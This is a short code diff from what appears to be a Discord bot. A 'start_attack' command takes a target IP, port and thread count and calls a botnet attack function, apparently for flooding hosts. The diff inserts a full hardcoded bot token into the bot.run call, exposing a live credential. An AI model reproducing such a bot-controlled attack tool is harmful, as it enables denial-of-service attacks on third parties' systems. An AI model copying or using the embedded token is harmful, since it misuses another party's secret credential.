@@ -88,4 +88,4 @@ async def start_attack(ctx, ip: str, port: int, threads: int):
     botnet_attack(ip, port, threads)
 
 # تشغيل البوت
-bot.run('')
+bot.run('MTM1ODE1MTYzODE4MzA1NTU1MQ.GYU_Lz.Pn0rkx9L9eHCWCrPNNF5jpl_fZIsC2cwvcQNiM')
